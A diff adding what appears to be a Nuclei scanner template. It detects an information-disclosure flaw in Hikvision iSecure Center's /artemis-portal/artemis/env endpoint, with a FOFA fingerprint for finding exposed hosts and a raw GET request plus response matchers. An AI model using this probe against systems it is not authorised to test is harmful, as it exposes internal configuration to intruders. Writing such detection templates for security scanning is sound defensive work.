@@ -1,0 +1,26 @@
+id: hikvision-env-Information-disclosure
+
+info:
+  tags: hikvision-env-Information-disclosure
+  name: 综合安防管理平台 iSecure Center /artemis-portal/artemis/env 信息泄露
+  author: xc
+  severity: medium
+  description: |-
+    fofa: body="/portal/skin/isee/redblack/"
+    综合安防管理平台 iSecure Center /artemis-portal/artemis/env存在信息泄露
+
+http:
+  - raw:
+      - |
+        GET /artemis-portal/artemis/env HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{"profiles":["prod"]'
+          - 'ENV=non-prod'
+      - type: status
+        status: 
+          - 200
